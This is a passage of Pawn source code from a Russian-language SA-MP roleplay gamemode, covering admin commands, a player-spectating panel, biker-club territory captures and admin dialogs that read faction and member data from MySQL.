	SaveMySQL(2, playerid);
	PlayerInfo[playerid][pAdmin] = 0;
	PlayerInfo[playerid][pLogin] = 0;
	for(new i=0;i<players;i++)
	{
		if(Players[i]==playerid)
		{
			Players[i]=Players[--players];
			Players[players]=-1;
			break;
		}
	}
	for(new i = 0; i < 5; i++)
	{
		if(spys[i][0] == playerid)
		{
		    spys[i][0] = -1;
		    spys[i][1] = -1;
		    format(YCMDstr, 80, " (( Шпион %s вышел из игры. Маскировка освободилась ))", PlayerInfo[playerid][pName]);
			SendFamilyMessage(2, 0x00b953ff, YCMDstr);
		}
	}
	new pIps[32];
	GetPlayerIp(playerid, pIps, 32);
	new szDisconnectReason[3][] =
    {
        "Crash",
        "Самовольно",
        "Принудительно"
    };
	printf("Игрок %s вышел с сервера IP: [%s] (%s)",PlayerInfo[playerid][pName], pIps, szDisconnectReason[reason]);
	return true;
}
/*CMD:test(playerid, params[])
{
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите /test [1-15]");
	switch(params[0])
	{
        case 1: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_HOUSE"`",true,"OnMySQL_QUERY","iis",11,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 1");
		case 2: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_BIZZ"`",true,"OnMySQL_QUERY","iis",6,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 2");
		case 3: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_WORKSHOPS"`",true,"OnMySQL_QUERY","iis",7,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 3");
		case 4: mysql_function_query(DATABASE,"SELECT * FROM `boost`",true,"OnMySQL_QUERY","iis",34,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 4");
		case 5: mysql_function_query(DATABASE,"SELECT * FROM `boost`",true,"OnMySQL_QUERY","iis",35,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 5");
		case 6: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_KVARTIRS"`",true,"OnMySQL_QUERY","iis",8,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 6");
		case 7: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_PODEZDS"`",true,"OnMySQL_QUERY","iis",9,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 7");
		case 8: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_CASINO"`",true,"OnMySQL_QUERY","iis",10,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 8");
		case 9: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_OTHERS"`",true,"OnMySQL_QUERY","iis",0,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 9");
		case 10: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_ATM"`",true,"OnMySQL_QUERY","iis",22,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 10");
		case 11: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_FARM"`",true,"OnMySQL_QUERY","iis",28,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 11");
		case 12: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_STALL"`",true,"OnMySQL_QUERY","iis",31,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 12");
		case 13: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_GANGZONE"`",true,"OnMySQL_QUERY","iis",32,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 13");
		case 14: mysql_function_query(DATABASE,"SELECT * FROM `grating`",true,"OnMySQL_QUERY","iis",55,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 14");
		case 15: mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_BAN"`",true,"OnMySQL_QUERY","iis",26,-1,""), SCM(playerid, -1, " [TEST CMD] Ошибка в case 15");
	}
	return 1;
}*/
CMD:setsatiety(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4) return true;
	if(sscanf(params, "ud", params[0], params[1])) return SCM(playerid, -1, " Введите: /setsatiety [id] [0-100]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, -1, " Игрока с данным ID нет на сервере.");
	if(params[1] > 100 || params[1] < 0) return SCM(playerid, -1, " Уровень сытости должен быть от 0 до 100!");
	PlayerInfo[params[0]][pSatiety] = params[1];
 	SendMes(params[0],-1, "Вам установили уровень сытости на %d", params[1]);
 	SendMes(playerid,-1, "Вы установили уровень сытости игроку %s на %d", Name(params[0]), params[1]);
	return 1;
}
CMD:onlyoneip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10) return true;
	if(onlyOneIp)
	{
	    onlyOneIp = false;
	    SCM(playerid, COLOR_REDD, " Success!");
	}
	else
	{
		onlyOneIp = true;
	    SCM(playerid, COLOR_GREEN, " Success!");
	}
	printf("Администратор %s включил вход на сервер только с одного аккаунта",Name(playerid));
	return true;
}
stock LoadRecon(playerid)
{
	ReconPlayer[0] = CreatePlayerTextDraw(playerid,530.000000, 180.000000, "x");
	PlayerTextDrawBackgroundColor(playerid, ReconPlayer[0], 0x000000AA);
	PlayerTextDrawFont(playerid, ReconPlayer[0], 3);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[0], 0.000000, 20.600000);
	PlayerTextDrawColor(playerid,ReconPlayer[0], 0xE1E1E1AA);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[0], 1);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[0], 1);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[0], 2);
	PlayerTextDrawUseBox(playerid,ReconPlayer[0], 1);
	PlayerTextDrawBoxColor(playerid,ReconPlayer[0], 0x00000055);
	PlayerTextDrawTextSize(playerid,ReconPlayer[0], 640.000, 0.000000);
	ReconPlayer[1] = CreatePlayerTextDraw(playerid,529.000000, 179.000000, "x");
	PlayerTextDrawBackgroundColor(playerid,ReconPlayer[1], 0x000000AA);
	PlayerTextDrawFont(playerid,ReconPlayer[1], 3);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[1], 0.000000, 20.600000);
	PlayerTextDrawColor(playerid,ReconPlayer[1], 0xE1E1E1AA);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[1], 1);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[1], 1);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[1], 2);
	PlayerTextDrawUseBox(playerid,ReconPlayer[1], 1);
	PlayerTextDrawBoxColor(playerid,ReconPlayer[1], 0xAAAAAA33);
	PlayerTextDrawTextSize(playerid,ReconPlayer[1], 641.000000, 0.000000);
	ReconPlayer[2] = CreatePlayerTextDraw(playerid,0.000, 180.000, "x");
	PlayerTextDrawBackgroundColor(playerid,ReconPlayer[2], 0x000000AA);
	PlayerTextDrawFont(playerid,ReconPlayer[2], 3);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[2], 0.000000, 18.540);
	PlayerTextDrawColor(playerid,ReconPlayer[2], 0xE1E1E1AA);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[2], 1);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[2], 1);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[2], 2);
	PlayerTextDrawUseBox(playerid,ReconPlayer[2], 1);
	PlayerTextDrawBoxColor(playerid,ReconPlayer[2], 0x00000055);
	PlayerTextDrawTextSize(playerid,ReconPlayer[2], 70.000, 0.000000);
	ReconPlayer[3] = CreatePlayerTextDraw(playerid,0.000, 179.000, "x");
	PlayerTextDrawBackgroundColor(playerid,ReconPlayer[3], 0x000000AA);
	PlayerTextDrawFont(playerid,ReconPlayer[3], 3);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[3], 0.000000, 18.746);
	PlayerTextDrawColor(playerid,ReconPlayer[3], 0xE1E1E1AA);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[3], 1);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[3], 1);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[3], 2);
	PlayerTextDrawUseBox(playerid,ReconPlayer[3], 1);
	PlayerTextDrawBoxColor(playerid,ReconPlayer[3], 0xAAAAAA33);
	PlayerTextDrawTextSize(playerid,ReconPlayer[3], 71.000, 0.000000);
	ReconPlayer[4] = CreatePlayerTextDraw(playerid,535.000, 210.000, "~n~~g~::Level:~n~~g~::Warns:~n~~r~::Armour:~n~~r~::Health:~n~~b~::CarHP:~n~~b~::Speed:~n~~y~::Ping:~n~~y~::Ammo:~n~~p~::Shot:~n~~p~::TimeShot:~n~~g~::AFKTime:~n~~g~::Engine:");
	PlayerTextDrawBackgroundColor(playerid,ReconPlayer[4], 0x000000AA);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[4], 1);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[4], 0.200, 1.100);
	PlayerTextDrawColor(playerid,ReconPlayer[4], 0xFFFFFFAA);
	PlayerTextDrawFont(playerid,ReconPlayer[4], 1);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[4], 2);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[4], 1);
	PlayerTextDrawUseBox(playerid,ReconPlayer[4], 0);
	ReconPlayer[5] = CreatePlayerTextDraw(playerid,575.000, 210.000, " ");
	PlayerTextDrawBackgroundColor(playerid,ReconPlayer[5], 0x000000AA);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[5], 1);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[5], 0.200, 1.100);
	PlayerTextDrawColor(playerid,ReconPlayer[5], 0xFFFFFFAA);
	PlayerTextDrawFont(playerid,ReconPlayer[5], 1);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[5], 2);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[5], 1);
	PlayerTextDrawUseBox(playerid,ReconPlayer[5], 0);
	ReconPlayer[6] = CreatePlayerTextDraw(playerid,585.000000, 190.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,ReconPlayer[6], 0x000000AA);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[6], 1);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[6], 0.300, 1.400);
	PlayerTextDrawColor(playerid,ReconPlayer[6], 0xFFFFFFAA);
	PlayerTextDrawFont(playerid,ReconPlayer[6], 1);
	PlayerTextDrawAlignment(playerid,ReconPlayer[6], 2);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[6], 2);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[6], 1);
	PlayerTextDrawUseBox(playerid,ReconPlayer[6], 0);
	CreateReconButtonn(playerid,35.000, 195.000, "Change", 7);
	CreateReconButtonn(playerid,35.000, 212.000, "Check >>", 8);
	CreateReconButtonn(playerid,35.000, 229.000, "Drop >>", 9);
	CreateReconButtonn(playerid,35.000, 246.000, "Kick >>", 10);
	CreateReconButtonn(playerid,35.000, 263.000, "Warn", 11);
	CreateReconButtonn(playerid,35.000, 280.000, "Ban >>", 12);
	CreateReconButtonn(playerid,35.000, 297.000, "Stats >>", 13);
	CreateReconButtonn(playerid,35.000, 314.000, "Refresh", 14);
	CreateReconButtonn(playerid,35.000, 331.000, "Exit", 15);
	CreateReconButtonn(playerid,100.000, 212.000, "Check-GM", 16);//Check >>
	CreateReconButtonn(playerid,100.000, 229.000, "Check-GM2", 17);//Check >>
	CreateReconButtonn(playerid,100.000, 246.000, "Check-GMCar", 18);//Check >>
	CreateReconButtonn(playerid,100.000, 263.000, "ResetShot", 19);//Check >>
	CreateReconButtonn(playerid,100.000, 229.000, "Mute", 20);//Drop >>
	CreateReconButtonn(playerid,100.000, 246.000, "Slap", 21);//Drop >>
	CreateReconButtonn(playerid,100.000, 263.000, "Prison", 22);//Drop >>
	CreateReconButtonn(playerid,100.000, 280.000, "Freeze", 23);//Drop >>
	CreateReconButtonn(playerid,100.000, 297.000, "UnFreeze", 24);//Drop >>
	CreateReconButtonn(playerid,100.000, 246.000, "SKick", 25);//Kick >>
	CreateReconButtonn(playerid,100.000, 263.000, "Kick", 26);//Kick >>
	CreateReconButtonn(playerid,100.000, 280.000, "Ban", 27);//Ban >>
	CreateReconButtonn(playerid,100.000, 297.000, "SBan", 28);//Ban >>
	CreateReconButtonn(playerid,100.000, 314.000, "IBan", 29);//Ban >>
	CreateReconButtonn(playerid,100.000, 297.000, "Stats", 30);//Stats >>
	CreateReconButtonn(playerid,100.000, 314.000, "IWep", 31);//Stats >>
	CreateReconButtonn(playerid,100.000, 331.000, "GetIP", 32);//Stats >>
	CreateReconButtonn(playerid,100.000, 348.000, "Serial/S0b", 33);//Stats >>
	CreateReconButtonn(playerid,585.00, 350.00, "Help", 34); // Рекон клавиша
	Seriu[playerid][0] = CreatePlayerTextDraw(playerid,589.00, 145.00, "Nik Anson~n~ID: 666");
	PlayerTextDrawAlignment(playerid,Seriu[playerid][0], 2);
	PlayerTextDrawLetterSize(playerid,Seriu[playerid][0],  0.240000, 0.899999);
	Seriu[playerid][1] = CreatePlayerTextDraw(playerid,578.00, 165.00, "1 : 1 / 8~n~0~n~0~n~50~n~0~n~0 / 0~n~86~n~0 : 0 ~n~0 / 0 : 0%~n~0 / 0 : 0%~n~23 : 0");
	PlayerTextDrawLetterSize(playerid,Seriu[playerid][1], 0.199999, 0.899999);
	for(new h; h < 2; h ++)
	{
		PlayerTextDrawBackgroundColor(playerid,Seriu[playerid][h], 255);
		PlayerTextDrawFont(playerid,Seriu[playerid][h], 1);
		PlayerTextDrawColor(playerid,Seriu[playerid][h], -1);
		PlayerTextDrawSetOutline(playerid,Seriu[playerid][h], 1);
		PlayerTextDrawSetProportional(playerid,Seriu[playerid][h], 1);
		PlayerTextDrawSetShadow(playerid,Seriu[playerid][h],0);
	}
}
stock UpdateFish(playerid)
{
	if(GetPVarInt(playerid,"fish_sonar")) format(string,128,"~y~Tackle: ~w~%i~n~~y~Worms: ~w~%i~n~~y~Sonar: ~w~%.2f~n~~n~~y~Press: ~g~L.ALT",GetPVarInt(playerid,"fish_gear"),GetPVarInt(playerid,"fish_worms"),Sonar[IsAtFishPlace(playerid)]);
	else format(string,128,"~y~Tackle: ~w~%i~n~~y~Worms: ~w~%i~n~~n~~y~Press: ~g~L.ALT",GetPVarInt(playerid,"fish_gear"),GetPVarInt(playerid,"fish_worms"));
	PlayerTextDrawSetString(playerid,FishingText[playerid],string);
	return true;
}
publics: SpMenu(playerid)
{
 	CallLocalFunction("OnPlayerCommandText", "is", playerid, "/spmenu");
}
publics: AdmMenu(playerid)
{
	CallLocalFunction("OnPlayerCommandText", "is", playerid, "/admmenu");
}
stock GetNameOfBiker(idx)
{
	switch(idx)
	{
	    case 24: string = "Hell's Angels MC";
	    case 26: string = "Warlocks MC";
	    case 29: string = "Pagans MC";
	    default: string = "Нет";
	}
	return string;
}
stock BikerCapt(atacks, others)
{
	if(atacks == 24) { if(IsCapted[hells]) return false; }
	if(atacks == 26) { if(IsCapted[warloks]) return false; }
	if(atacks == 29) { if(IsCapted[pagans]) return false; }
	new rand = random(3);
	GangZoneShowForAll(BikerZone[rand], 0xFF0000AA);
    GangZoneFlashForAll(BikerZone[rand], 0x0000FFAA);
	foreach(i)
	{
	    if(PlayerInfo[i][pMember] == atacks || PlayerInfo[i][pMember] == others)
	    {
	        SetPVarInt(i, "biker_capt", 1);
	        PlayerTextDrawShow(i, Capture[i]);
			SetPlayerToTeamColor(i);
			if(PlayerInfo[i][pMember] == atacks)
				BikerText[i] = Create3DTextLabel("Захват",0xFF0000AA, 30.0, 40.0, 50.0, 50.0,1);
			else
				BikerText[i] = Create3DTextLabel("Оборона",0x0000FFAA, 30.0, 40.0, 50.0, 50.0,1);
			Attach3DTextLabelToPlayer(BikerText[i], i, 0.0, 0.0, 0.4);
	    }
	    format(string,120,"~y~kills~n~~n~~g~%s:~w~ %i~n~~r~%s:~w~ %i", GetNameOfBiker(atacks), BikerKills[atack] , GetNameOfBiker(others), BikerKills[other]);
		PlayerTextDrawSetString(i,Capture[i],string);
	}
	ZoneCaptureBiker = BikerZone[rand];
	SetTimer("UpdateBikers", 2000, true);
	return true;
}
publics: UpdateBikers()
{
	foreach(i)
	{
	    if(PlayerInfo[i][pMember] == BikerCapture[atack] || PlayerInfo[i][pMember] == BikerCapture[other])
	    {
	        if(!GetPVarInt(i, "biker_capt"))
	        {
				SetPVarInt(i, "biker_capt",1);
				PlayerTextDrawShow(i, Capture[i]);
				SetPlayerToTeamColor(i);
				if(PlayerInfo[i][pMember] == BikerCapture[atack])
					BikerText[i] = Create3DTextLabel("Захват",0xFF0000FF, 30.0, 40.0, 50.0, 50.0,1);
				else
					BikerText[i] = Create3DTextLabel("Оборона",0x0000FFFF, 30.0, 40.0, 50.0, 50.0,1);
				Attach3DTextLabelToPlayer(BikerText[i], i, 0.0, 0.0, 0.4);
			}
			format(string,120,"~y~kills~n~~n~~g~%s:~w~ %i~n~~r~%s:~w~ %i", GetNameOfBiker(BikerCapture[atack]), BikerKills[atack] , GetNameOfBiker(BikerCapture[other]), BikerKills[other]);
			PlayerTextDrawSetString(i,Capture[i],string);
		}
	}
	SetTimer("UpdateBikers", 2000, true);
}
publics: CanCaptBiker()
{
	IsCapted[hells] = false;
	IsCapted[warloks] = false;
	IsCapted[pagans] = false;
	return true;
}
publics: StopCaptureBiker()
{
	if(BikerKills[atack] > BikerKills[other])
	{
        SendFamilyMessage(BikerKills[atack], COLOR_GREEN, " Ваш клуб выиграл!");
        SendFamilyMessage(BikerKills[atack], 0x954F4FFF, " Ваш клуб проиграл!");
        if(BikerCapture[reasons] >= 0 && BikerCapture[reasons] <= 4)
        {
            FarmInfo[BikerCapture[reasons]+1][fBiker] = BikerCapture[atack];
        }
        else if(BikerCapture[reasons] >= 5 && BikerCapture[reasons] <= 7)
        {
            WorkshopInfo[BikerCapture[reasons]+1][wBiker] = BikerCapture[atack];
        }
	}
	else if(BikerKills[other] > BikerKills[atack])
	{
		SendFamilyMessage(BikerKills[other], COLOR_GREEN, " Ваш клуб выиграл!");
		SendFamilyMessage(BikerKills[atack], 0x954F4FFF, " Ваш клуб выиграл!");
        /*if(BikerCapture[reasons] >= 0 && BikerCapture[reasons] <= 4)
        {
            FarmInfo[BikerCapture[reasons]][fBiker] = BikerCapture[other];
        }
        else if(BikerCapture[reasons] >= 5 && BikerCapture[reasons] <= 7)
        {
            WorkshopInfo[BikerCapture[reasons]][wBiker] = BikerCapture[other];
        }*/
	}
	else if(BikerKills[other] == BikerKills[atack])
	{
	    SendFamilyMessage(BikerCapture[atack], COLOR_BLUE, " У вас есть ещё 3 минуты чтобы решить какой клуб лучше!");
	    SendFamilyMessage(BikerCapture[other], COLOR_BLUE, " У вас есть ещё 3 минуты чтобы решить какой клуб лучше!");
	    SetTimer("StopCaptureBiker", 180000, true);
		return false;
	}
	foreach(i)
	{
		if(PlayerInfo[i][pMember] == BikerCapture[atack] || PlayerInfo[i][pMember] == BikerCapture[other])
		{
		    DeletePVar(i,"biker_capt");
			PlayerTextDrawHide(i, Capture[i]);
			DestroyDynamic3DTextLabel(BikerText[i]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(i,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
	}
	BikerCapture[atack] = 0;
	BikerCapture[other] = 0;
	BikerCapture[reasons] = -1;
	BikerKills[atack] = 0;
	BikerKills[other] = 0;
	KillTimer(SetTimer("updateBikers",2000,true));
    GangZoneStopFlashForAll(ZoneCaptureBiker);
	GangZoneHideForAll(ZoneCaptureBiker);
	return true;
}
stock IsCaptedBiker(memberfrac)
{
	switch(memberfrac)
	{
		case 24: return IsCapted[hells]?1:0;
		case 26: return IsCapted[warloks]?1:0;
		case 29: return IsCapted[pagans]?1:0;
	}
	return 0;
}
publics: Kicking(playerid)
{
	Kick(playerid);
	return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	//if(GetPVarInt(playerid,"USEDIALOGID") != dialogid) return Kick(playerid);
	while(strfind(inputtext, "%s",true) !=-1) strdel(inputtext,strfind(inputtext, "%s",true),strfind(inputtext, "%s",true)+2);
	while(strfind(inputtext, "%",true) !=-1) strdel(inputtext,strfind(inputtext, "%",true),strfind(inputtext, "%",true)+2);
	new gun,ammo;
	new gunname[32];
	new playername[MAX_PLAYER_NAME];
	SetPVarInt(playerid, "USEDIALOGID", 0);
	GetPlayerName(playerid, playername, sizeof(playername));
	switch(dialogid)
	{
	case 9999:
        {
			if(!response) return true;
			switch(listitem)
			{
				case 0:
				{
					if(PlayerInfo[playerid][pAdmin] < 7)  return SCM(playerid, COLOR_RED, "Функция доступна только Гл. Администрации");
					ShowPlayerDialogEx(playerid, 9955, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Информация | {AE433D}Управление сервером",
					"Функция\n[0] Сохранить данные с сервера\n[1] Управление античитом [{33AA33}NEW!{FFFFFF}]\n[2] Включить бонусы [{33AA33}NEW!{FFFFFF}]",
					"Далее", "Закрыть");
				}
				case 1:
				{
					SCM(playerid, COLOR_YELLOW, "Администрация Online:");
					foreach(i)
					{
						if(!IsPlayerConnected(i) || (!PlayerInfo[i][pLogin])) continue;
						if(PlayerInfo[i][pAdmin] < 1 || PlayerInfo[i][pAdmin] > 6) continue;
						if(GetPVarInt(i,"AFK_Time") > 2) format(YCMDstr, 256, "%s[ID: %i] [lvl: %i] [AFK: %s сек]",Name(i),i,PlayerInfo[i][pAdmin], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
						else format(YCMDstr, 256, "%s[ID: %i] [lvl: %i]",Name(i),i,PlayerInfo[i][pAdmin]);
						SCM(playerid, COLOR_YELLOW2, YCMDstr);
					}
					return false;
				}
				/*case 2:
				{
						if(!dostup[playerid]) return true;
						if(PlayerInfo[playerid][pAdmin] < 7)  return SCM(playerid, COLOR_RED, "Функция доступна только Гл. Администрации");
						foreach(i) PlayerInfo[i][pGifts] +=1;
						format(YCMDstr, sizeof(YCMDstr), "[A-LOG %s[%i] Give all players bonus Gifts",PlayerInfo[playerid][pName],playerid);
						SendAdminMessage(COLOR_RED, YCMDstr);
						SendClientMessageToAll(COLOR_FGREEN, "Администрация сервера выдала всем бонусную прокрутку подробнее {F5F5F5}'/gift' {33AA33}или {F5F5F5}'/mm » [11] Подарочное вращение'");
						return false;
				}*/
				case 2:
				{
						if(!dostup[playerid]) return true;
						if(PlayerInfo[playerid][pAdmin] < 2)  return SCM(playerid, COLOR_RED, "Функция вам не доступна");
						new stringer[1024];
						format(string, 48, "(1) LCN\t\t\t\t %i $\n", MafiaBank[0][nLcn]); strcat(stringer, string);
						format(string, 48, "(2) Yakuza\t\t\t %i $\n", MafiaBank[0][nYakuza]); strcat(stringer, string);
						format(string, 48, "(3) Мэрия\t\t\t %i $\n", FracBank[0][fKazna]); strcat(stringer, string);
						format(string, 48, "(4) SF News\t\t\t %i $\n", FracBank[0][fSfnews]); strcat(stringer, string);
						format(string, 48, "(5) Ballas\t\t\t %i $\n", FracBank[0][fBallas]); strcat(stringer, string);
						format(string, 48, "(6) Vagos\t\t\t %i $\n", FracBank[0][fVagos]); strcat(stringer, string);
						format(string, 48, "(7) RM\t\t\t\t %i $\n",MafiaBank[0][nRm]); strcat(stringer, string);
						format(string, 48, "(7) Grove\t\t\t %i $\n",FracBank[0][fGrove]); strcat(stringer, string);
						format(string, 48, "(8) LS News\t\t\t %i $\n",FracBank[0][fLsnews]); strcat(stringer, string);
						format(string, 48, "(9) Aztec\t\t\t %i $\n",FracBank[0][fAztek]); strcat(stringer, string);
						format(string, 48, "(10) Rifa\t\t\t %i $\n",FracBank[0][fRifa]); strcat(stringer, string);
						format(string, 48, "(12) LV News\t\t\t %i $\n",FracBank[0][fLvnews]); strcat(stringer, string);
						format(string, 48, "(13) Hell's Angels MC\t\t %i $\n",FracBank[0][fHamc]); strcat(stringer, string);
						format(string, 48, "(14) Warlocks MC\t\t %i $\n",FracBank[0][fWmc]); strcat(stringer, string);
						ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX,"Админ панель",stringer,"Готово", "Отмена");
						return false;
				}
				case 3:
				{
					if(IsPlayerConnected(playerid))
					{
						SCM(playerid, 0xF10DEB10AA, "Лидеры фракции Online:");
						foreach(i)
						{
							if(PlayerInfo[i][pLeader]>0 && PlayerInfo[i][pLogin] == 1)
							{
								new ttext[60];
								if(PlayerInfo[i][pLeader] == 1) { ttext = "LSPD"; }
								else if(PlayerInfo[i][pLeader] == 2) { ttext = "ФБР"; }
								else if(PlayerInfo[i][pLeader] == 3) { ttext = "Армия СФ"; }
								else if(PlayerInfo[i][pLeader] == 4) { ttext = "Медики СФ"; }
								else if(PlayerInfo[i][pLeader] == 5) { ttext = "LCN"; }
								else if(PlayerInfo[i][pLeader] == 6) { ttext = "Yakuza"; }
								else if(PlayerInfo[i][pLeader] == 7) { ttext = "Мэр"; }
								else if(PlayerInfo[i][pLeader] == 8) { ttext = "Casino Bilagio"; }
								else if(PlayerInfo[i][pLeader] == 9) { ttext = "SF News"; }
								else if(PlayerInfo[i][pLeader] == 10) { ttext = "SFPD"; }
								else if(PlayerInfo[i][pLeader] == 11) { ttext = "Инструкторы"; }
								else if(PlayerInfo[i][pLeader] == 12) { ttext = "Ballas"; }
								else if(PlayerInfo[i][pLeader] == 13) { ttext = "Vagos"; }
								else if(PlayerInfo[i][pLeader] == 14) { ttext = "Russian mafia"; }
								else if(PlayerInfo[i][pLeader] == 15) { ttext = "Grove"; }
								else if(PlayerInfo[i][pLeader] == 16) { ttext = "LS News"; }
								else if(PlayerInfo[i][pLeader] == 17) { ttext = "Aztec"; }
								else if(PlayerInfo[i][pLeader] == 18) { ttext = "Rifa"; }
								else if(PlayerInfo[i][pLeader] == 19) { ttext = "Армия ЛВ"; }
								else if(PlayerInfo[i][pLeader] == 20) { ttext = "LV News"; }
								else if(PlayerInfo[i][pLeader] == 22) { ttext = "Медики ЛС"; }
								else if(PlayerInfo[i][pLeader] == 33) { ttext = "Медики ЛВ"; }
								else if(PlayerInfo[i][pLeader] == 21) { ttext = "LVPD"; }
								format(string, 144, " [Фракция: %s] [Ник Лидера: %s] [ID: %i]",ttext, Name(i),i);
								SCM(playerid, 0x6BB3FFAA, string);
							}
						}
					}
				}
				case 4:
				{
					SCM(playerid, 0xF10DEB10AA, "В разработке");
				}
			}
        }
    case 9955:
        {
			if(!response) return true;
			switch(listitem)
			{
				case 0:
				{
					if(PlayerInfo[playerid][pLogin] == 0) return true;
					if (PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
					format(YCMDstr, sizeof(YCMDstr), "[Admin Logs] %s выполняет сохранение сервера",PlayerInfo[playerid][pName]);
					SendAdminMessage(COLOR_LIGHTRED, YCMDstr);
					SaveMySQL(0);
					for(new i = 1; i <= TOTALCASINO; i++) SaveMySQL(1,i);
					for(new i = 1; i <= TOTALSHOPS; i++) SaveMySQL(3,i);
					for(new i = 1; i <= TotalBizz; i++) SaveMySQL(4,i);
					for(new i = 1; i <= TotalHouse; i++) SaveMySQL(5,i);
					for(new i = 1; i <= ALLKVARTIRI; i++) SaveMySQL(6,i);
					for(new i = 1; i <= AllPODEZD; i++) SaveMySQL(7,i);
					for(new i = 1; i <= TOTALATM; i++) SaveMySQL(8,i);
					for(new i = 1; i <= TOTALFARM; i++) SaveMySQL(9,i);
					SendClientMessage(playerid,COLOR_LIGHTRED, "Все данные были успешно сохранены.");
					return true;
				}
				case 1: cmd::eac(playerid, "");
				case 2: cmd::booston(playerid, "");
			}
        }
	case 19284:
	    {
	        if(!response) return true;
			if(strfind(inputtext, "<< Пред. страница") != -1)
			SetPVarInt(playerid, "off_list", GetPVarInt(playerid, "off_list")-1);
			else if(strfind(inputtext, ">> След. страница") != -1)
			SetPVarInt(playerid, "off_list", GetPVarInt(playerid, "off_list")+1);
	        else
	        {
	            new names[32];
	            sscanf(inputtext, "s[32]s[32]s[32]", inputtext,names, inputtext);
				SetPVarString(playerid, "offmembers_info", names);
				ShowPlayerDialog(playerid, 19285, DIALOG_STYLE_LIST, names, "[0] Информация\n[1] Повысить/Понизить\n[2] Уволить", "Выбор", "Назад");
				return true;
	        }
	        new stringer[2048];
	        new ss = GetPVarInt(playerid, "off_admin");
	        if(ss == 0) ss = PlayerInfo[playerid][pMember];
            mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i'", ss);
			new Cache:result = mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
			    new bool:label = true;
			    format(stringer, sizeof(stringer), "[#] Имя\tРанг\tПоследний вход\tАктивность за сутки/неделю\n");
				for(new i = GetPVarInt(playerid, "off_list")*29; i < r; i++)
				{
				    if(i%29 == 0)
				    {
				        if(label) label = false;
						else {label = true; break;}
				    }
				    new Names[32], Vxod[32];
					cache_get_field_content(i,"Name",Names,DATABASE,60);
					cache_get_field_content(i,"pOnline",Vxod,DATABASE,32);
					new pChass = cache_get_field_content_int(i, "pChas");
					new pMinn = cache_get_field_content_int(i, "pMin");
					new Rank = cache_get_field_content_int(i,"pRank");
					format(YCMDstr, sizeof(YCMDstr), "[%i] %s\t%i\t%s\t%i / %i часов\n",i, Names, Rank,Vxod,pMinn, pChass);
					strcat(stringer, YCMDstr);
				}

		        if(GetPVarInt(playerid, "off_list") != 0) strcat(stringer, "<< Пред. страница\n");
		        if(label)
		        strcat(stringer, ">> След. страница");
				ShowPlayerDialog(playerid, 19284, DIALOG_STYLE_TABLIST_HEADERS, "Состав оффлайн", stringer, "Выбрать", "Назад");
			}
			return cache_delete(result, DATABASE);
	    }
	case 19285:
	    {
	        if(!response)
	        {
